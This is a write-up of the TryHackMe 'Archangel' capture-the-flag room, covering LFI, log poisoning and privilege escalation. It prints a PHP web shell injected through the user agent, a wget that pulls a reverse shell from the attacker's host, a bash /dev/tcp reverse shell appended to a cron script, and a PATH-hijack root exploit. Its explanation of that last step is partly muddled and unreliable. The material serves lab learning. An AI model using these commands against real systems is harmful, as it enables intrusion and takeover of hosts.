---
title: "Archangel"
date: 2023-12-31
layout: "simple"
categories: [TryHackme]
tags: [Boot2root]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---
Hello guys and welcome to yet another writeup. This is ye another easy box on tryhackme and is accessible [here](https://tryhackme.com/room/archangel)
We shall tackle some awesome topics which include:
  1. LFI.
  2. Priviledge exploitation.
  3. Web exploitation.
With that said let us get right to it

## NMAP scan.
As usual we are gonna start of by scanning open ports on our machine.
![1](https://i.ibb.co/ZVjYSZ9/nmap.png)

We are able to see that port 80 is open and is hosting a web application.
we are able to view a home page which does not have alot on it but we can see a type of hostname

![2](https://i.ibb.co/YLJjDwK/wavefire.png)

We can actually use this and and it to our **/etc/hosts** file, then try and go to the page.
![3](https://i.ibb.co/TWTBYN0/mafia.png)

## LFI.
Okay guys it is about to get really messy in here. Stay frosty.

So first of all we are going to FUZZ for hidden directories.

![4](https://i.ibb.co/kQRKnYg/wfuzz.png)

And we get a hit for **robots.txt**. which when we visit the page looks something like this.

![5](https://i.ibb.co/vv2SyZj/robots.png).

And we can actually see another directory **/test.php**. visit this page and we can view another page with a button.

![6](https://i.ibb.co/cJPSy3b/control.png)

We can then see that the button redirects us to **?view=/var/www/html/development_testing/mrrobot.php**.

From here we can try to do a path traversal filter. After hours of trial and error I found this filter and it worked.
**php://filter/convert.base64-encode/resource=**
Okay so now we can see some base64 code 
let us try and change **mrrobot.php** to **test.php**. And we can see some more base64. let us decode that.

![7](https://i.ibb.co/pnGV1tK/testbase64.png)
![8](https://i.ibb.co/944fSfv/lfiflag.png)

And we can get a flag but also we can see some php filters on it.
## Acesslog
Okay so the filter dictates that using **../..** which we can easily bypasss by using **..//..**

Next let us try and view the access log using the bypass.

![9](https://i.ibb.co/f98gBfQ/accesslog.png)

So next we can try and pass some malicious code to the user agent. **<?php system($_GET['cmd']); ?>**.
So to do this follow this steps.

 1. right click and press Inspect on the dropdown menu.
 2. click on the Network option and reload the page
 3. Hit resend.
 4. scroll to the user agent and replace with the malicious code.
 5. Hit send.

Smooth so next up let us try and execute some commands on it.
let us try and add **&cmd=ls** to the end of the url.

![10](https://i.ibb.co/WWmnG2H/cmd-ls.png)

We can actually run commands on it. so next let us try and get a reverse shell.

## SHELL
So we are going to get a sample php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
Next, we are going to set up a python server on our machine. 
Next, we are going to run **&cmd=wget http://ip/revshell.php**
We should be able to get a 200 code on our machine.
![11](https://i.ibb.co/4jKLJfz/httpserver.png)

next start up a listener on your machine
Then run **&cmd=php revshell.php**
going back to our listener we have a shell.

![12](https://i.ibb.co/gzQvS34/nc.png)


## Switch user.

So next we can get a better shell by using **python3 -c "import pty;pty.spawn('/bin/bash -i')"**

Then we can check out the cron jobs **cat /etc/crontab**

We can actually see that a job runs as archangel every minute. Which we can read and write.
So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**

![13](https://i.ibb.co/qFqjRB3/archangel.png)

Then run another listener and wait for a minute. Coffee break.

## ROOT

Moving into the secret directory we can see a file called backup. Running does not do much so we are going to do something crazy. 
So type:
 1. **echo '/bin/bash -p' > cp**
 2. **chmod 777 cp**
 3. **export PATH=/home/archangel/secret:$PATH**
 4. **echo $PATH**
 5. **./backup**

Okay let us dig into what jus happened. This is gonna be crazy but heck.

 1. **echo '/bin/bash -p' > cp**: This command redirects the output of the `echo` command, which is the string `'/bin/bash -p'`, into a file named `cp`. The content of the `cp` file will be `/bin/bash -p`.

 2. **chmod 777 cp**: This command changes the permissions of the `cp` file to allow all users to read, write, and execute it. The `chmod` command is used to modify file permissions, and `777` is a symbolic representation that grants all permissions to the owner, group, and others.

 3. **export PATH=/home/archangel/secret:$PATH**: This command adds a directory called `/home/archangel/secret` to the beginning of the `PATH` environment variable. The `PATH` variable contains a list of directories that the shell searches for executable files. By adding `/home/archangel/secret` at the beginning, any executable file in that directory will take precedence over files with the same name in other directories listed in `PATH`.

 4. **echo $PATH**: This command displays the value of the `PATH` environment variable. After the previous `export` command, it will show `/home/archangel/secret` followed by the original directories that were part of `PATH`.

 5. **./backup**: This command attempts to execute a file named `backup` in the current directory. The `./` prefix indicates that the file should be executed from the current directory instead of searching for it in the directories listed in `PATH`. If the `backup` file exists and has executable permissions, it will be run with the elevated privileges specified in step 1 (`/bin/bash -p`).

Overall, these commands create a file called `cp` with elevated permissions, modify the `PATH` environment variable to prioritize a specific directory, and execute a file named `backup` with elevated privileges. The exact consequences and implications of these actions depend on the specific context and contents of the `backup` file.

And yes we are root.
![14](https://i.ibb.co/tCf2k5W/root.png)

## RESOURCES
[BASH FOR BEGINNERS](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/)
[PHP TRICKS](https://devansh.xyz/ctfs/2021/09/11/php-tricks.html)

Okay honestly that was a great learning experience for me and I hope it is the same for you. 
Happy hacking :)

